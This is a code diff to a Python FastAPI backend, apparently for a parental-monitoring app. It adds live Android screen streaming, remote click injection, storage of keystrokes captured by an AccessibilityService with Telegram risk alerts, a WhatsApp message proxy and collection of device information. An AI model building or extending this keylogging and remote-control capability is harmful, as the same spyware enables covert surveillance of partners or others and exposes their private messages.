@@ -14,6 +14,8 @@ from services import app_scanner, browser_history, geo_service, risk_engine, not
 from services import local_backup_service, db_service
 from services import weekly_report as weekly_report_svc
 from services import keyword_service, keystroke_archiver, telegram_notifier, restriction_service
+from services import supabase_heartbeat
+from services import screen_time_service
 import socketio
 import aiofiles
 from fastapi.staticfiles import StaticFiles
@@ -162,8 +164,9 @@ async def whatsapp_sentinel():
 
 @app.on_event("startup")
 async def startup_event():
-    # Bekçiyi başlat
     asyncio.create_task(whatsapp_sentinel())
+    # Supabase Heartbeat — Cihaz durumunu Supabase'e periyodik olarak bildir
+    asyncio.create_task(supabase_heartbeat.heartbeat_loop("default", interval=30))
     # Mevcut profilleri yükle
     saved_profiles = db_service.load_profiles()
     for p_dict in saved_profiles:
@@ -263,8 +266,10 @@ async def upload_screenshot(profile_id: str = Form(...), image: UploadFile = Fil
         content = await image.read()
         await out_file.write(content)
     
-    await sio.emit("new_screenshot", {"profileId": profile_id, "url": f"/screenshots/{filename}"})
-    return {"url": f"/screenshots/{filename}"}
+    url = f"/screenshots/{filename}"
+    await sio.emit("new_screenshot", {"profileId": profile_id, "url": url})
+    await supabase_heartbeat.push_screenshot(profile_id, url)
+    return {"url": url}
 
 
 @app.get("/api/screenshots/{profile_id}")
@@ -303,11 +308,49 @@ async def disconnect(sid):
             del _mobile_connections[pid]
             break
 
+@sio.on("screen_frame")
+async def handle_screen_frame(sid, data):
+    """Android'den gelen ekran karelerini tüm dashboard istemcilerine yayınlar."""
+    pid = data.get("profileId") if isinstance(data, dict) else None
+    await sio.emit("screen_frame", data)   # broadcast to all frontend clients
+
+
+@sio.on("request_screen_stream")
+async def handle_request_screen_stream(sid, data):
+    """Frontend'den gelen akış başlatma isteğini mobil cihaza iletir."""
+    pid = data.get("profileId", "default") if isinstance(data, dict) else "default"
+    mobile_sid = _mobile_connections.get(pid)
+    if mobile_sid:
+        await sio.emit("start_screen_stream", {}, to=mobile_sid)
+
+
+@sio.on("stop_screen_stream")
+async def handle_stop_screen_stream(sid, data):
+    """Frontend'den gelen akış durdurma isteğini mobil cihaza iletir."""
+    pid = data.get("profileId", "default") if isinstance(data, dict) else "default"
+    mobile_sid = _mobile_connections.get(pid)
+    if mobile_sid:
+        await sio.emit("stop_screen_stream", {}, to=mobile_sid)
+
+
+@sio.on("remote_click")
+async def handle_remote_click(sid, data):
+    """Ebeveyn dashboard'ından gelen tıklama koordinatını mobil cihaza iletir."""
+    pid = data.get("profileId", "default") if isinstance(data, dict) else "default"
+    mobile_sid = _mobile_connections.get(pid)
+    if mobile_sid:
+        await sio.emit("remote_click", data, to=mobile_sid)
+
+
 @sio.on("register")
 async def handle_register(sid, data):
     pid = data.get("profileId")
     if pid:
         _mobile_connections[pid] = sid
+        # Android cihaz bilgilerini kaydet
+        device_info = {k: v for k, v in data.items() if k != "profileId"}
+        if device_info:
+            db_service.save_android_device_info(pid, device_info)
 
 
 @app.get("/", response_class=HTMLResponse)
@@ -662,6 +705,14 @@ async def get_suspicious_calls(profile_id: str, limit: int = 200):
     return {"total": len(calls), "night_calls": night, "frequent_unknown": frequent[:10]}
 
 
+@app.get("/api/screen_time/{profile_id}")
+async def get_screen_time(profile_id: str, days: int = 7):
+    """Son `days` günün uygulama ekran süresi (knowledgeC.db). Yerel backup gerektirir."""
+    _require_profile(profile_id)
+    data = screen_time_service.get_screen_time(profile_id, days=days)
+    return {"profile_id": profile_id, "days": days, "apps": data, "total": len(data)}
+
+
 @app.get("/api/comms/{profile_id}/summary")
 async def get_comms_summary(profile_id: str):
     """Dashboard Safety Alert için birleşik iletişim riski özeti döndürür."""
@@ -850,24 +901,6 @@ async def get_timeline(profile_id: str, limit: int = 40):
     except Exception:
         pass
 
-    # Database messages (Seeded or synced from other sources)
-    try:
-        db_msgs = db_service.get_message_history(profile_id, limit=limit)
-        for m in db_msgs:
-            # Avoid duplication with live WhatsApp if ID matches or just add all
-            # Here we add if source is not whatsapp (to avoid double counting if synced)
-            # Actually, let's just add everything and sort by TS
-            events.append({
-                "type": "message", "source": m.get("source", "System").upper(),
-                "title": m.get("chat_name") or m.get("sender", "?"),
-                "subtitle": m.get("text", ""),
-                "ts": m.get("timestamp"),
-                "risk_level": m.get("risk_level", "none"),
-                "is_deleted": bool(m.get("is_deleted", 0)),
-            })
-    except Exception:
-        pass
-
     events.sort(key=lambda e: e.get("ts") or "", reverse=True)
     return events[:limit]
 
@@ -980,6 +1013,31 @@ class AppLimitRequest(BaseModel):
     allow_from:     str | None = None   # "HH:MM"
     allow_until:    str | None = None   # "HH:MM"
 
+
+
+@app.post("/api/android-keystrokes/{profile_id}")
+async def post_android_keystroke(profile_id: str, body: dict):
+    """Android AccessibilityService'ten gelen klavye verilerini kaydeder (JSON body)."""
+    _require_profile(profile_id)
+    app_name = body.get("app_name", "unknown")
+    text = body.get("text", "")
+    if not text:
+        return {"status": "skipped"}
+    db_service.save_keystroke(profile_id, app_name, text)
+    keystroke_archiver.archive_keystroke(profile_id, app_name, text)
+    risk_level, _ = risk_engine.analyze_text(text)
+    if risk_level != "none":
+        desc = f"[{app_name}] Android riskli yazışma: {text[:40]}"
+        risk_engine.record_event(
+            profile_id=profile_id,
+            event_type="Riskli Yazışma",
+            description=desc,
+            score=40 if risk_level == "high" else 20,
+        )
+        asyncio.create_task(
+            telegram_notifier.send_telegram_alert(f"⚠️ **Riskli Yazışma:** {desc}")
+        )
+    return {"status": "logged"}
 
 
 @app.post("/api/keystrokes/{profile_id}")
@@ -1263,6 +1321,66 @@ async def list_deleted_android_messages(profile_id: str, limit: int = 100):
     """Silinen Android bildirim mesajlarını döndürür."""
     _require_profile(profile_id)
     return db_service.get_android_notifications(profile_id, limit=limit, deleted_only=True)
+
+
+# ── WhatsApp Agent Proxy (CORS-safe, frontend → backend → WA agent) ───────────
+
+_WA_AGENT = os.getenv("WA_AGENT_URL", "http://localhost:3001")
+
+@app.get("/api/wa/messages")
+async def proxy_wa_messages(limit: int = 300):
+    """WhatsApp agent'ından mesajları proxy ederek frontend'e iletir."""
+    try:
+        async with httpx.AsyncClient(timeout=5.0) as c:
+            r = await c.get(f"{_WA_AGENT}/api/messages?limit={limit}")
+            if r.status_code == 200:
+                return r.json()
+    except Exception:
+        pass
+    return []
+
+
+@app.get("/api/wa/messages/flagged")
+async def proxy_wa_flagged(limit: int = 200):
+    """WhatsApp agent'ından riskli/silinen mesajları proxy eder."""
+    try:
+        async with httpx.AsyncClient(timeout=5.0) as c:
+            r = await c.get(f"{_WA_AGENT}/api/messages/flagged?limit={limit}")
+            if r.status_code == 200:
+                return r.json()
+    except Exception:
+        pass
+    return []
+
+
+@app.get("/api/wa/health")
+async def proxy_wa_health():
+    """WhatsApp agent sağlık durumunu proxy eder."""
+    try:
+        async with httpx.AsyncClient(timeout=3.0) as c:
+            r = await c.get(f"{_WA_AGENT}/health")
+            if r.status_code == 200:
+                return r.json()
+    except Exception:
+        pass
+    return {"connected": False, "status": "unreachable"}
+
+
+# ── Android Device Info ────────────────────────────────────────────────────────
+
+@app.post("/api/android-device/{profile_id}")
+async def register_android_device(profile_id: str, body: dict):
+    """Android ajan cihaz bilgilerini kaydeder (model, os, battery, wifi)."""
+    _require_profile(profile_id)
+    db_service.save_android_device_info(profile_id, body)
+    return {"status": "saved"}
+
+
+@app.get("/api/android-device/{profile_id}")
+async def get_android_device(profile_id: str):
+    """Son kaydedilen Android cihaz bilgilerini döndürür."""
+    _require_profile(profile_id)
+    return db_service.get_android_device_info(profile_id) or {}
 
 
 # ── Remote Diagnostics ────────────────────────────────────────────────────────
